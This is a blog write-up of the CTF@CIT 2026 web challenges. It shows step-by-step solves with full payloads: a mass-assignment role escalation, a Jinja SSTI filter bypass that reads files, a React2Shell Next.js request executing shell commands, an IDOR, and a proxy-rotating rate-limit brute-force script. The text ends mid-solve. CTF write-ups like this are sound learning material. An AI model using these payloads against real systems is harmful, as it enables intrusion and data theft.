---
layout: post
title:  "Web Challenges"
date:   2026-04-19 16:59:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /CTF@CIT-2026-web/
---
* TOC
{:toc}

## Debug Disaster

**Author**: 10splayaSec

**Category**: Web

**Description**: Developing this application is tough, and I needed debug mode to be enabled... but I'm nervous I forgot to turn it off in production. I also think I may have forgot to remove something from the application structure. [http://23.179.17.92:5002](http://23.179.17.92:5002)

I go to the site and this is all I see:
```shell
curl http://23.179.17.92:5002/  
<h2>Welcome to Startup Portal</h2>
```

Eventually I manually guess `/admin` and find this:

![Alt text](/images/ctfcitweb1.png)

`/flg_bar` endpoint reveals the flag:
```shell
curl http://23.179.17.92:5002/flg_bar  
  
SECRET_KEY=supersecret  
FLAG=CIT{H1dd3n_D1r5_3v3rywh3r3}  
DATABASE_URL=sqlite:///prod.db
```

`CIT{H1dd3n_D1r5_3v3rywh3r3}`

___

## A Massive Problem

**Author**: 10splayaSec

**Category**: Web

**Description**: Improper Authorization has been fixed! I think we are ready for production! SHA1: `d1799d474a5ee0e222fbc7df3cce00772dc4de9b`. [http://23.179.17.92:5556](http://23.179.17.92:5556)

I get the challenge files:
```shell
unzip a-massive-problem.zip  
Archive:  a-massive-problem.zip  
   creating: a-massive-problem/  
  inflating: a-massive-problem/Dockerfile  
  inflating: a-massive-problem/docker-compose.yml  
   creating: a-massive-problem/app/  
  inflating: a-massive-problem/app/app.py  
   creating: a-massive-problem/app/__pycache__/  
  inflating: a-massive-problem/app/__pycache__/app.cpython-313.pyc  
   creating: a-massive-problem/app/static/  
  inflating: a-massive-problem/app/static/style.css  
   creating: a-massive-problem/app/templates/  
  inflating: a-massive-problem/app/templates/dashboard.html  
  inflating: a-massive-problem/app/templates/account_profile.html  
  inflating: a-massive-problem/app/templates/login.html  
  inflating: a-massive-problem/app/templates/index.html  
  inflating: a-massive-problem/app/templates/profile.html  
  inflating: a-massive-problem/app/templates/admin.html  
 extracting: a-massive-problem/app/requirements.txt
```

Contents of `app.py`:
```python
from flask import Flask, request, session, redirect, url_for, render_template, jsonify
import os
import re
import sqlite3

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'change-this-secret')
app.config['DATABASE'] = os.getenv('DATABASE', '/app/data.db')


def get_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    conn.row_factory = sqlite3.Row
    return conn


def valid_password(password):
    if len(password) < 8:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'\d', password):
        return False
    if not re.search(r'[^A-Za-z0-9]', password):
        return False
    return True



def init_db():
    conn = get_db()
    conn.execute('create table if not exists users (username text primary key, password text not null, role text not null, full_name text not null, title text not null, team text not null)')
    conn.commit()
    conn.close()


@app.route('/')
def index():
    if session.get('username'):
        return redirect(url_for('dashboard'))
    return render_template('index.html')


@app.route('/login')
def login_page():
    if session.get('username'):
        return redirect(url_for('dashboard'))
    notice = session.pop('auth_notice', None)
    return render_template('login.html', notice=notice)


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))


@app.route('/api/register', methods=['POST'])
def register():
    incoming = request.get_json(silent=True) or request.form.to_dict()
    username = incoming.get('username', '').strip()
    password = incoming.get('password', '')
    full_name = incoming.get('full_name', '').strip()
    title = incoming.get('title', '').strip()
    team = incoming.get('team', '').strip()
    if not username or not password or not full_name or not title or not team:
        return jsonify({'error': 'Please complete all required fields.'}), 400
    if not valid_password(password):
        return jsonify({'error': 'Password does not meet policy.'}), 400
    record = {
        'username': username,
        'password': password,
        'role': 'standard',
        'full_name': full_name,
        'title': title,
        'team': team
    }
    record.update(incoming)
    if not record.get('username') or not record.get('password') or not record.get('role'):
        return jsonify({'error': 'Unable to create account.'}), 400
    conn = get_db()
    conn.execute(
        'insert into users (username, password, role, full_name, title, team) values (?, ?, ?, ?, ?, ?) '
        'on conflict(username) do update set password=excluded.password, role=excluded.role, full_name=excluded.full_name, title=excluded.title, team=excluded.team',
        (record['username'], record['password'], record['role'], record['full_name'], record['title'], record['team'])
    )
    conn.commit()
    conn.close()
    session['auth_notice'] = {
        'title': 'Account created',
        'message': 'Your workspace account is ready. Sign in to continue.'
    }
    return jsonify({'redirect': url_for('login_page')})


@app.route('/api/login', methods=['POST'])
def login():
    incoming = request.get_json(silent=True) or request.form.to_dict()
    username = incoming.get('username', '').strip()
    password = incoming.get('password', '')
    conn = get_db()
    user = conn.execute(
        'select username, role, full_name, title, team from users where username = ? and password = ?',
        (username, password)
    ).fetchone()
    conn.close()
    if not user:
        return jsonify({'error': 'Invalid username or password.'}), 401
    session['username'] = user['username']
    session['role'] = user['role']
    return jsonify({'redirect': url_for('dashboard')})


@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    conn = get_db()
    user = conn.execute('select username, role, full_name, title, team from users where username = ?', (session['username'],)).fetchone()
    conn.close()
    if not user:
        session.clear()
        return redirect(url_for('login_page'))
    return render_template('dashboard.html', user=user)


@app.route('/profile')
def profile():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    conn = get_db()
    user = conn.execute('select username, role, full_name, title, team from users where username = ?', (session['username'],)).fetchone()
    conn.close()
    if not user:
        session.clear()
        return redirect(url_for('login_page'))
    return render_template('profile.html', user=user)


@app.route('/api/profile', methods=['POST'])
def update_profile():
    if 'username' not in session:
        return jsonify({'error': 'Authentication required.'}), 401
    incoming = request.get_json(silent=True) or request.form.to_dict()
    conn = get_db()
    current = conn.execute('select username, password, role, full_name, title, team from users where username = ?', (session['username'],)).fetchone()
    if not current:
        conn.close()
        session.clear()
        return jsonify({'error': 'Authentication required.'}), 401
    record = {
        'username': current['username'],
        'password': current['password'],
        'role': current['role'],
        'full_name': current['full_name'],
        'title': current['title'],
        'team': current['team']
    }
    record.update(incoming)
    if record.get('password') != current['password'] and not valid_password(record.get('password', '')):
        conn.close()
        return jsonify({'error': 'Password does not meet policy.'}), 400
    conn.execute(
        'update users set password = ?, role = ?, full_name = ?, title = ?, team = ? where username = ?',
        (record['password'], record['role'], record['full_name'], record['title'], record['team'], current['username'])
    )
    conn.commit()
    conn.close()
    session.clear()
    session['auth_notice'] = {
        'title': 'Profile updated',
        'message': 'Your changes were saved. Sign in again to continue.'
    }
    return jsonify({'redirect': url_for('login_page')})


@app.route('/admin')
def admin():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard'))
    return render_template('admin.html', username=session.get('username'), flag=os.getenv('FLAG', 'CIT{test_flag}'))


if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)
```

Looks like a basic app where you can register, login, and go to your profile and dashboard. I need to get to `/admin` to get the flag. My role needs to be `admin`:
```python
@app.route('/admin')
def admin():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard'))
    return render_template('admin.html', username=session.get('username'), flag=os.getenv('FLAG', 'CIT{test_flag}'))
```

I go to the site:

![Alt text](/images/ctfcitweb2.png)

I intercept the request to `/api/register` while I'm registering:
```http
POST /api/register HTTP/1.1
Host: 23.179.17.92:5556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://23.179.17.92:5556/
Content-Type: application/json
Content-Length: 96
Origin: http://23.179.17.92:5556
DNT: 1
Connection: keep-alive
Priority: u=0

{"full_name":"uzi","username":"uzi","title":"none","team":"none","password":"^Lq?)bK6;FYt6'}"}
```

I change the request to this then forward it (adding `"role":"admin"`):
```http
POST /api/register HTTP/1.1
Host: 23.179.17.92:5556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://23.179.17.92:5556/
Content-Type: application/json
Content-Length: 96
Origin: http://23.179.17.92:5556
DNT: 1
Connection: keep-alive
Priority: u=0

{"full_name":"uzi","username":"uzi","role":"admin","title":"none","team":"none","password":"^Lq?)bK6;FYt6'}"}
```

Once I sign in, I can go to `/admin` and get the flag:

![Alt text](/images/ctfcitweb3.png)

`CIT{M@ss_@ssignm3nt_Pr1v3sc}`

___
{% raw %}
## Temporary Destruction

**Author**: 10splayaSec

**Category**: Web

**Description**: I hear something.... SHA1: `f03edd0e2d6a6a41916605ae0f7b3ba479e317d6` [http://23.179.17.92:5558](http://23.179.17.92:5558)

I get the challenge files:
```shell
sha1sum temporary-destruction.zip  
f03edd0e2d6a6a41916605ae0f7b3ba479e317d6  temporary-destruction.zip  

unzip temporary-destruction.zip  
Archive:  temporary-destruction.zip  
   creating: temporary-destruction/  
  inflating: temporary-destruction/app.py  
  inflating: temporary-destruction/Dockerfile  
  inflating: temporary-destruction/docker-compose.yml  
   creating: temporary-destruction/static/  
   creating: temporary-destruction/static/css/  
  inflating: temporary-destruction/static/css/style.css  
   creating: temporary-destruction/static/js/  
  inflating: temporary-destruction/static/js/main.js
```

Contents of `app.py`:
```python
from flask import Flask, render_template_string, request
import re

app = Flask(__name__)

BLOCKED = re.compile(r'__\w+__')

PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Temporary Destruction</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
<div class="vignette"></div>
<div class="grid-bg"></div>

<div class="wrapper">
    <div class="brand">
        <span class="brand-line"></span>
        <h1 class="title" data-text="TEMPORARY DESTRUCTION">TEMPORARY DESTRUCTION</h1>
        <span class="brand-line"></span>
    </div>

    <p class="tagline">something is listening.</p>

    <div class="card">
        <div class="card-bar">
            <div class="bar-dots">
                <i></i><i></i><i></i>
            </div>
        </div>
        <div class="card-inner">
            <form method="POST" action="/" autocomplete="off">
                <div class="field">
                    <textarea
                        name="user_input"
                        id="inp"
                        rows="5"
                        spellcheck="false"
                    >{{ raw_input }}</textarea>
                </div>
                <div class="actions">
                    <button type="submit">
                        <span>TRANSMIT</span>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </button>
                </div>
            </form>
        </div>
    </div>

    {% if output is not none %}
    <div class="response {% if is_error %}bad{% endif %}">
        <div class="card-bar">
            <div class="bar-dots"><i></i><i></i><i></i></div>
        </div>
        <div class="response-inner">
            <pre>{{ output }}</pre>
        </div>
    </div>
    {% endif %}
</div>

<script src="/static/js/main.js"></script>
</body>
</html>'''


@app.route('/', methods=['GET', 'POST'])
def index():
    raw_input = ''
    output = None
    is_error = False

    if request.method == 'POST':
        raw_input = request.form.get('user_input', '')

        if BLOCKED.search(raw_input):
            output = 'rejected.'
            is_error = True
        else:
            try:
                output = render_template_string(raw_input)
            except Exception:
                output = 'error.'
                is_error = True

    return render_template_string(
        PAGE,
        raw_input=raw_input,
        output=output,
        is_error=is_error
    )


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

Dunder is blocked completely: `BLOCKED = re.compile(r'__\w+__')`

I go to the site and test for SSTI with `{{7*7}}`:

![Alt text](/images/ctfcitweb4.png)

SSTI is confirmed! But no dunders. After testing it for a while I try attaching the dicts as query parameters:
```shell
curl -X POST "http://23.179.17.92:5558/?g=__globals__&b=__builtins__" -d "user_input={{ (url_for|attr(request.args.g)).get(request.args.b).get('open')('/tmp/flag.txt').read() }}" -H "Content-Type: application/x-www-form-urlencoded"
```

The payload uses `request.args.g` and `request.args.b` to supply `__globals__` and `__builtins__` without writing them directly in the template. The `attr` filter retrieves an attribute whose name is provided as a string. Since `url_for.__globals__` is blocked `url_for|attr(request.args.g)` becomes `url_for.__globals__`. Using `.get(request.args.b)` retrieves the `__builtins__` key. `__builtins__` contains the `open` function which reads `/tmp/flag.txt`. Finally `.read()` returns the flag.

Request:
```http
POST /?g=__globals__&b=__builtins__ HTTP/1.1
Host: 23.179.17.92:5558
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://23.179.17.92:5558/
Content-Type: application/x-www-form-urlencoded
Content-Length: 149
Origin: http://23.179.17.92:5558
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user_input=%7B%7B+%28url_for%7Cattr%28request.args.g%29%29.get%28request.args.b%29.get%28%27open%27%29%28%27%2Ftmp%2Fflag.txt%27%29.read%28%29+%7D%7D
```

Output:
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Temporary Destruction</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
  </head>
  <body>
    <div class="vignette"></div>
    <div class="grid-bg"></div>
    <div class="wrapper">
      <div class="brand">
        <span class="brand-line"></span>
        <h1 class="title" data-text="TEMPORARY DESTRUCTION">TEMPORARY DESTRUCTION</h1>
        <span class="brand-line"></span>
      </div>
      <p class="tagline">something is listening.</p>
      <div class="card">
        <div class="card-bar">
          <div class="bar-dots">
            <i></i>
            <i></i>
            <i></i>
          </div>
        </div>
        <div class="card-inner">
          <form method="POST" action="/" autocomplete="off">
            <div class="field">
              <textarea name="user_input" id="inp" rows="5" spellcheck="false">{{ (url_for|attr(request.args.g)).get(request.args.b).get(&#39;open&#39;)(&#39;/tmp/flag.txt&#39;).read() }}</textarea>
            </div>
            <div class="actions">
              <button type="submit">
                <span>TRANSMIT</span>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </button>
            </div>
          </form>
        </div>
      </div>
      <div class="response ">
        <div class="card-bar">
          <div class="bar-dots">
            <i></i>
            <i></i>
            <i></i>
          </div>
        </div>
        <div class="response-inner">
          <pre>CIT{55T1_R3m0t3_C0d3_3x3cut1on}</pre>
        </div>
      </div>
    </div>
    <script src="/static/js/main.js"></script>
  </body>
</html>
```

![Alt text](/images/ctfcitweb5.png)

`CIT{55T1_R3m0t3_C0d3_3x3cut1on}`
{% endraw %}
___

## Server Components

**Author**: 10splayaSec

**Category**: Web

**Description**: I've patched the components on the application, we are secure now! [http://23.179.17.92:5555](http://23.179.17.92:5555)

This challenge is blind. I go to the site:

![Alt text](/images/ctfcitweb6.png)

Looking at wappalyzer I find they are running `NodeJS 15.0.4`. Looking at the source code also shows they run React. A quick google search shows the site is vulnerable to [React2Shell](https://react2shell.com/). I have manually exploited this before, so I have a payload prepared. I intercept a request to the site and send the request to the repeater in burpsuite. Then I change the request method to `POST` and change it from this:
```http
GET / HTTP/1.1
Host: 23.179.17.92:5555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Priority: u=4
```

To this:
```http
POST / HTTP/1.1
Host: 23.179.17.92:5555
Next-Action: x
X-Nextjs-Request-Id: 11111111
X-Nextjs-Html-Request-Id: 11111111111111111111
Content-Type: multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
Content-Length: 713

------HacxMeBoundaryX9K2pLvN4MqR8TdF
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim().replace(/\\n/g, ' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------HacxMeBoundaryX9K2pLvN4MqR8TdF
Content-Disposition: form-data; name="1"

"$@0"
------HacxMeBoundaryX9K2pLvN4MqR8TdF
Content-Disposition: form-data; name="2"

[]
------HacxMeBoundaryX9K2pLvN4MqR8TdF--
```

This confirms I have RCE. I get the output in a response header:
```http
HTTP/1.1 303 See Other
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
cache-control: private, no-cache, no-store, max-age=0, must-revalidate
x-action-revalidated: [[],0,0]
x-action-redirect: /login?a=uid=100(ctf) gid=101(ctf) groups=101(ctf),101(ctf);push
content-type: text/x-component
date: Fri, 17 Apr 2026 20:41:13 GMT
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 4040
```

Some commands didnt seem to want to work so it took a while to find the flag. After looking around the machine I find the flag in `/opt`:
```http
POST / HTTP/1.1
Host: 23.179.17.92:5555
Next-Action: x
X-Nextjs-Request-Id: 11111111
X-Nextjs-Html-Request-Id: 11111111111111111111
Content-Type: multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
Content-Length: 713

------HacxMeBoundaryX9K2pLvN4MqR8TdF
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('cat ../opt/flag.txt').toString().trim().replace(/\\n/g, ' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------HacxMeBoundaryX9K2pLvN4MqR8TdF
Content-Disposition: form-data; name="1"

"$@0"
------HacxMeBoundaryX9K2pLvN4MqR8TdF
Content-Disposition: form-data; name="2"

[]
------HacxMeBoundaryX9K2pLvN4MqR8TdF--
```

Response:
```http
HTTP/1.1 303 See Other
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
cache-control: private, no-cache, no-store, max-age=0, must-revalidate
x-action-revalidated: [[],0,0]
x-action-redirect: /login?a=CIT{R3aCt_1s_Vu1n3r@bl3};push
content-type: text/x-component
date: Fri, 17 Apr 2026 20:33:47 GMT
x-nextjs-cache: HIT
x-nextjs-prerender: 1
X-Powered-By: Next.js
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 4014

...page contents... etc
```

`CIT{R3aCt_1s_Vu1n3r@bl3}`

___

## Intern Portal

**Author**: 10splayaSec

**Category**: Web

**Description**: The intern said they made a custom report application... but I don't think security was in mind. [http://23.179.17.92:5001](http://23.179.17.92:5001)

I go the site and register and login. Then I'm on the dashboard:

![Alt text](/images/ctfcitweb7.png)

After creating a test report it takes me to `http://23.179.17.92:5001/report?id=7275`:

![Alt text](/images/ctfcitweb8.png)

I test for an IDOR in the test id. Request:
```http
GET /report?id=1 HTTP/1.1
Host: 23.179.17.92:5001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: session=eyJ1c2VyX2lkIjo2NDR9.aeKdpw.dSa-mi9xRyWeg6jjZEfS47V26nc
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Response:
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.11.15
Date: Fri, 17 Apr 2026 20:53:44 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1311
Vary: Cookie
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
  ...
  css...
  ...
</head>
<body>

  <div class="container">

    <div class="header">
      <h2>📄 Report</h2>
      <a href="/" class="back">← Back to Dashboard</a>
    </div>

    <div class="report-content">
      Fake report #1
    </div>

    <div class="meta">
      Report ID: 1
    </div>

  </div>

</body>
</html>
```

After searching through some id numbers I find they created fake reports from id `1-500`. All reports after that are made by other players. 

Report 5 says: `Fake report #5 — Definitely too low`

Report 6 says: `Fake report #6 — This is too low, maybe 300 above us`

Report 350 says: `Fake report #350 — You're close, but a bit too high`

Report 347 contains the flag. Request:
```http
GET /report?id=347 HTTP/1.1
Host: 23.179.17.92:5001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: session=eyJ1c2VyX2lkIjo2NDR9.aeKdpw.dSa-mi9xRyWeg6jjZEfS47V26nc
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Response:
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.11.15
Date: Fri, 17 Apr 2026 20:59:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1327
Vary: Cookie
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
  ...
  css...
  ...
</head>
<body>

  <div class="container">

    <div class="header">
      <h2>📄 Report</h2>
      <a href="/" class="back">← Back to Dashboard</a>
    </div>

    <div class="report-content">
      CIT{Acc355_C0ntr0l_M@tt3rs!}
    </div>

    <div class="meta">
      Report ID: 347
    </div>

  </div>

</body>
</html>
```

`CIT{Acc355_C0ntr0l_M@tt3rs!}`

___

## Hit Your Limit

**Author**: 10splayaSec

**Category**: Web

**Description**: A wise man once said, stay calm, cool and collected. Don't go above your limit.

This is another blind challenge (no source code). I go to the site:

![Alt text](/images/ctfcitweb9.png)

The site checks the flag letter by letter. Each time you type a letter a GET request is sent to `/api/flag?guess=`, for example:
```http
GET /api/flag?guess=CIT{ HTTP/1.1
Host: 23.179.17.92:5559
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://23.179.17.92:5559/
DNT: 1
Connection: keep-alive
Priority: u=4
```

The response:
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.13
Date: Fri, 17 Apr 2026 23:51:42 GMT
Content-Type: application/json
Content-Length: 21
X-RateLimit-Remaining: 4
Connection: close

{"result":"correct"}
```
When you guess wrong the response is: `{"result":"incorrect"}`.

The response header `X-RateLimit-Remaining` tells you how many requests you have before being rate limited. You get 5 guesses and then a timeout of 300 seconds. 

Assuming the rate limiting is based on IP address, I just opt to use proxies to slowly enumerate the flag. 5 guesses for each IP. Solve script:
```python
#!/usr/bin/env python3

import requests
import time
import sys
from typing import List, Optional

TARGET_URL = "http://23.179.17.92:5559/api/flag"
FLAG_LEN = 32
KNOWN_PREFIX = "CIT{"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-@"

GUESSES_PER_PROXY = 5
REQUEST_TIMEOUT = 10
RETRY_COUNT = 2
DELAY_BETWEEN_GUESSES = 0.3

def load_proxies(filename: str) -> List[str]:
    # load proxies from file. one IP:port per line. all SOCKS5
    proxies = []
    with open(filename, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                proxies.append(f"socks5://{line}")
    print(f"Loaded {len(proxies)} proxies from {filename}")
    return proxies

def make_guess(guess: str, proxy: str, retries=RETRY_COUNT) -> Optional[bool]:
    # send guess through proxy. returns True (correct), False (incorrect), None (error/rate limit)
    proxy_dict = {"http": proxy, "https": proxy}
    for attempt in range(retries + 1):
        try:
            resp = requests.get(TARGET_URL, params={"guess": guess},
                                proxies=proxy_dict,
                                timeout=REQUEST_TIMEOUT,
                                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            if resp.status_code == 429:
                return None   # rate limited
            data = resp.json()
            return data.get("result") == "correct"
        except Exception:
            if attempt == retries:
                return None
            time.sleep(0.5)
    return None

def brute_force(proxies: List[str]) -> Optional[str]:
    flag = KNOWN_PREFIX
    proxy_idx = 0
    guesses_used = 0

    print(f"\nStarting brute force with {len(proxies)} proxies.")
    print(f"Each proxy gets {GUESSES_PER_PROXY} guesses.\n")
    print(f"Current flag prefix: {flag}\n")

    while len(flag) < FLAG_LEN:
        print(f"[Position {len(flag)+1}/{FLAG_LEN}]")
        found = False
        for ch in CHARSET:
            guess = flag + ch
            print(f"  Trying: {guess}", end='', flush=True)

            # Get current proxy
            proxy = proxies[proxy_idx % len(proxies)]
            result = make_guess(guess, proxy)
            guesses_used += 1

            if result is True:
                flag = guess
                print(" Correct!")
                found = True
                guesses_used = 0
                proxy_idx = 0          # start from first proxy for next character
                break
            elif result is False:
                print(" x")
            else:
                # proxy failed
                print(" x (proxy dead, removing)")
                proxies.pop(proxy_idx % len(proxies))
                if not proxies:
                    print("\nNo proxies left!")
                    return None
                # retry the same guess with next proxy
                continue

            # rotate proxy after GUESSES_PER_PROXY incorrect guesses
            if guesses_used >= GUESSES_PER_PROXY:
                proxy_idx += 1
                guesses_used = 0
                print(f"    [Rotating to proxy #{proxy_idx+1}]")

            time.sleep(DELAY_BETWEEN_GUESSES)

        if not found:
            print(f"\nNo character found. charset may be incomplete :(")
            return None

    print("\nVerifying full flag...")
    for proxy in proxies[:3]:
        if make_guess(flag, proxy) is True:
            print(f"\nFlag: {flag}")
            return flag
    print(f"\nLikely the flag: {flag}")
    return flag

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <proxies_file>")
        print("Example: python3 solve.py proxies.txt")
        sys.exit(1)

    proxies = load_proxies(sys.argv[1])
    if not proxies:
        print("No proxies loaded. Exiting.")
        sys.exit(1)

    flag = brute_force(proxies)
    if flag:
        print(f"\nDone! Flag: {flag}")
    else:
        print("\nFailed to retrieve flag.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        sys.exit(0)
```

After a while I start getting the flag:
```shell
python3 solve2.py checked_proxies.txt  
Loaded 78 proxies from checked_proxies.txt  
  
Starting brute force with 78 proxies.  
Each proxy gets 5 guesses.  
  
Current flag prefix: CIT{R@T3_L1m1t  
  
[Position 15/32]  
Trying: CIT{R@T3_L1m1ta x
Trying: CIT{R@T3_L1m1tb x 
Trying: CIT{R@T3_L1m1tc x 
Trying: CIT{R@T3_L1m1td x  
Trying: CIT{R@T3_L1m1te x  
[Rotating to proxy #2]  
Trying: CIT{R@T3_L1m1tf x  
Trying: CIT{R@T3_L1m1tg x  
Trying: CIT{R@T3_L1m1th x
... etc
```

Eventually I get the flag:
```shell
python3 solve2.py checked_proxies.txt  
Loaded 356 proxies from checked_proxies.txt  
  
Starting brute force with 356 proxies.  
Each proxy gets 5 guesses.  
  
Current flag prefix: CIT{R@T3_L1m1t1nG_15_Bypass@ble  
  
[Position 32/32]  
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@blea x  
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@bleb x  
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@blec x  
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@bled x  
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@blee x   
[Rotating to proxy #2]

... etc

[Rotating to proxy #11]  
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@ble8 x  
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@ble9 x
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@ble_ x 
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@ble{ x
Trying: CIT{R@T3_L1m1t1nG_15_Bypass@ble} Correct!  
  
Verifying full flag...  
  
Flag: CIT{R@T3_L1m1t1nG_15_Bypass@ble}  
  
Done! Flag: CIT{R@T3_L1m1t1nG_15_Bypass@ble}
```

Not sure if this is the intended solve since it does take a while because the proxies are unstable, but it does work.

`CIT{R@T3_L1m1t1nG_15_Bypass@ble}`

___

## Sign Up and Enjoy

**Author**: 10splayaSec

**Category**: Web

**Description**: I'm confused, what does this application do exactly? [http://23.179.17.92:5557](http://23.179.17.92:5557)

Another blind challenge with no source code! I go to the site:

![Alt text](/images/ctfcitweb10.png)

I create an account and login:

![Alt text](/images/ctfcitweb11.png)

Once I am logged in I see a cookie is set:
```shell
Cookie: session=eyJyb2xlIjoic3RhbmRhcmQiLCJ1aWQiOiJ1XzZiYzNiYzg1IiwidXNlcm5hbWUiOiJ1emkifQ.aeLONw.6COUHlOyvlrGR6Y2ZAJSNmCmjrE
```

Base64 decoding the first segment reveals some information:
```shell
echo "eyJyb2xlIjoic3RhbmRhcmQiLCJ1aWQiOiJ1XzZiYzNiYzg1IiwidXNlcm5hbWUiOiJ1emkifQ" | base64 -d  
{"role":"standard","uid":"u_6bc3bc85","username":"uzi"}
```

I successfully brute force the secret key (flask secret):
```shell
